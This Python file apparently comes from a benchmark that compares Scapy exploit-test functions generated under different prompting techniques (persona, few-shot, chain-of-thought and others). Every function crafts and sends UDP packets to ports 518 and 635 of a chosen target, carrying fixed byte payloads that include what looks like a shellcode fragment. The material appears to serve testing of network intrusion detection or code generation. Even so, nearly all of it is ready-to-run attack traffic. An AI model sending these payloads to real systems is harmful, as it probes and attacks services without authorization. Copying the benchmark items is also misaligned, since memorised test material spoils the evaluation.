from scapy.all import *
import ipaddress
import warnings
from ipaddress import *
import re


def ground_truth_code_exploitTest(src, dst, iface, count):
    
    pkt = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load=b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    send(pkt, iface=iface, count=count)
    
    pkt = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load=b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    send(pkt, iface=iface, count=count)
    

def persona_exploitTest(src, dst, iface, count):
    pkt1 = IP(src=src, dst=dst)/UDP(dport=518)/Raw(load=b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    pkt2 = IP(src=src, dst=dst)/UDP(dport=635)/Raw(load=b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    send(pkt1, iface=iface, count=count)
    send(pkt2, iface=iface, count=count)


def template_exploitTest(src, dst, iface, count):
    try:
        pkt1 = Ether()/IP(src=src, dst=dst)/UDP(dport=518)/b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8"
        pkt2 = Ether()/IP(src=src, dst=dst)/UDP(dport=635)/b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F"
        sendp(pkt1, iface=iface, count=count)
        sendp(pkt2, iface=iface, count=count)
    except Exception as e:
        print(f"An error occurred: {e}")
       

def question_refinement_exploitTest(src, dst, iface, count):
    def is_valid_ip(address):
        try:
            ip_address(address)
            return True
        except AddressValueError:
            return False
    def is_valid_iface(iface):
        return re.match(r'^[a-zA-Z]+\d*$', iface) is not None
    if not is_valid_ip(src):
        print("Invalid source IP address")
    if not is_valid_ip(dst):
        print("Invalid destination IP address")
    if not is_valid_iface(iface):
        print("Invalid network interface")
    if not isinstance(count, int) or count <= 0:
        print("Count must be a positive integer")
    pkt1 = Ether() / IP(src=src, dst=dst) / UDP(dport=518, sport=53) / b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8"
    pkt2 = Ether() / IP(src=src, dst=dst) / UDP(dport=635, sport=53) / b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F"
    try:
        print(f"Sending packets from {src} to {dst} through interface {iface}.")
        for _ in range(count):
            sendp(pkt1, iface=iface, verbose=False)
            sendp(pkt2, iface=iface, verbose=False)
        print("Packets successfully sent.")
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        

def alternative_approaches_exploitTest(src, dst, iface, count):
    packet_518 = IP(src=src, dst=dst)/UDP(dport=518)/Raw(load=b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    packet_635 = IP(src=src, dst=dst)/UDP(dport=635)/Raw(load=b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    sendp(packet_518, iface=iface, count=count)
    sendp(packet_635, iface=iface, count=count)
    

def context_manager_exploitTest(src, dst, iface, count):
    pkt1 = Ether()/IP(src=src, dst=dst)/UDP(sport=53, dport=518)/Raw(load=b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
    pkt2 = Ether()/IP(src=src, dst=dst)/UDP(sport=53, dport=635)/Raw(load=b'^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F')
    sendp([pkt1, pkt2]*count, iface=iface)


def flipped_interaction_3_exploitTest(src, dst, iface, count):
    payload1 = b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8"
    payload2 = b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F"
    pkt1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load=payload1)
    pkt2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load=payload2)
    for _ in range(count):
        try:
            send(pkt1, iface=iface, verbose=False)
            send(pkt2, iface=iface, verbose=False)
        except Exception as e:
            print(f"An error occurred: {e}")


def flipped_interaction_4_exploitTest(src, dst, iface, count):
    pkt1 = IP(src=src, dst=dst)/UDP(sport=RandShort(), dport=518)/Raw(load=b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    pkt2 = IP(src=src, dst=dst)/UDP(sport=RandShort(), dport=635)/Raw(load=b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    for i in range(count):
        send(pkt1, iface=iface, verbose=False)
        send(pkt2, iface=iface, verbose=False)
    print(f"Packets sent {count} times from {src} to {dst} over interface {iface}")


def flipped_interaction_5_exploitTest(src, dst, iface, count):
    pkt1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load=b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    for _ in range(count):
        send(pkt1, iface=iface)
    pkt2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load=b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    for _ in range(count):
        send(pkt2, iface=iface)

def iterative_prompting_3_exploit_test(src, dst, iface, count):
    conf.ipv6_enabled = False
    ip_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if not ip_pattern.match(src) or not ip_pattern.match(dst):
        raise ValueError("Invalid IP address format.")
    if not isinstance(iface, str) or not iface.strip():
        raise ValueError("Interface must be a non-empty string.")
    if not isinstance(count, int) or count <= 0:
        raise ValueError("Count must be a positive integer.")
    load1 = b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8"
    load2 = b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F"
    try:
        pkt1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load=load1)
        pkt2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load=load2)
        send(pkt1, iface=iface, count=count)
        send(pkt2, iface=iface, count=count)
    except Exception as e:
        print(f"An error occurred: {e}")

def iterative_prompting_4_exploit_test(src, dst, iface, count):
    if not isinstance(src, str) or not isinstance(dst, str) or not isinstance(iface, str):
        raise ValueError("src, dst, and iface must all be strings.")
    if not isinstance(count, int) or count <= 0:
        raise ValueError("count must be a positive integer.")
    try:
        packet1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load=b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
        packet2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load=b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
        send(packet1, iface=iface, count=count, verbose=False)
        send(packet2, iface=iface, count=count, verbose=False)
    except Exception as e:
        print(f"Error sending packets: {e}")


def iterative_prompting_5_exploit_test(src, dst, iface, count):
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
    try:
        ipaddress.ip_address(src)
        ipaddress.ip_address(dst)
    except ValueError as e:
        raise ValueError(f"Invalid IP address: {e}")
    if iface not in get_if_list():
        raise ValueError(f"Interface '{iface}' not found.")
    if not isinstance(count, int) or count <= 0:
        raise ValueError("Count must be a positive integer.")
    payload1 = b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8"
    payload2 = b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F"
    try:
        pkt1 = Ether() / IP(src=src, dst=dst) / UDP(dport=518) / Raw(load=payload1)
        pkt2 = Ether() / IP(src=src, dst=dst) / UDP(dport=635) / Raw(load=payload2)
    except Exception as e:
        raise ValueError(f"Error creating packets: {e}")
    for _ in range(count):
        try:
            sendp(pkt1, iface=iface, verbose=False)
            sendp(pkt2, iface=iface, verbose=False)
        except Exception as e:
            raise RuntimeError(f"Error sending packets: {e}")

def few_shots_prompting_exploitTest(src, dst, iface, count):
    pkt1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load=b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
    send(pkt1)
    pkt2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load=b'^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F')
    send(pkt2, iface=iface, count=count)

def cot_prompting_exploitTest(src, dst, iface, count):
    pkt1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    send(pkt1, iface=iface, count=count)
    pkt2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    send(pkt2, iface=iface, count=count)

def fact_check_list_exploitTest(src, dst, iface, count):
    packet1 = IP(src=src, dst=dst) / UDP(dport=518) / b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8"
    packet2 = IP(src=src, dst=dst) / UDP(dport=635) / b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F"
    send(packet1, iface=iface, count=count, verbose=True)
    send(packet2, iface=iface, count=count, verbose=True)
    
    
def not_interactive_mix_exploitTest(src, dst, iface, count):
    if not isinstance(src, str) or not isinstance(dst, str) or not isinstance(iface, str) or not isinstance(count, int):
        raise ValueError("Invalid input types. Expected src, dst, iface as strings and count as an integer.")
    def is_valid_ip(address):
        parts = address.split('.')
        if len(parts) != 4:
            return False
        for item in parts:
            try:
                if not 0 <= int(item) <= 255:
                    return False
            except ValueError:
                return False
        return True
    if not is_valid_ip(src) or not is_valid_ip(dst):
        raise ValueError("Invalid IP address format for src or dst.")
    try:
        pkt1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
        send(pkt1, iface=iface, count=count)
    except Exception as e:
        print(f"Error sending first packet: {str(e)}")
    try:
        pkt2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
        send(pkt2, iface=iface, count=count)
    except Exception as e:
        print(f"Error sending second packet: {str(e)}")

def interactive_mix_send_packets(src, dst, iface=None, count=1):
    try:
        if not isinstance(src, str) or not isinstance(dst, str):
            raise ValueError("Source and destination IP addresses must be strings.")
        if iface and not isinstance(iface, str):
            raise ValueError("Interface must be a string if provided.")
        if not isinstance(count, int) or count < 1:
            raise ValueError("Count must be a positive integer.")
        pkt1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
        send(pkt1, iface=iface if iface else conf.iface, count=count, verbose=0)
        pkt2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
        send(pkt2, iface=iface if iface else conf.iface, count=count, verbose=0)
        print("Packets sent successfully.")
    except Exception as e:
        print(f"An error occurred: {e}")

def baseline_exploitTest(src, dst, iface, count):
    pkt1 = IP(src=src, dst=dst)/UDP(dport=518)/Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    pkt2 = IP(src=src, dst=dst)/UDP(dport=635)/Raw(load="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    send(pkt1, iface=iface, count=count)
    send(pkt2, iface=iface, count=count)

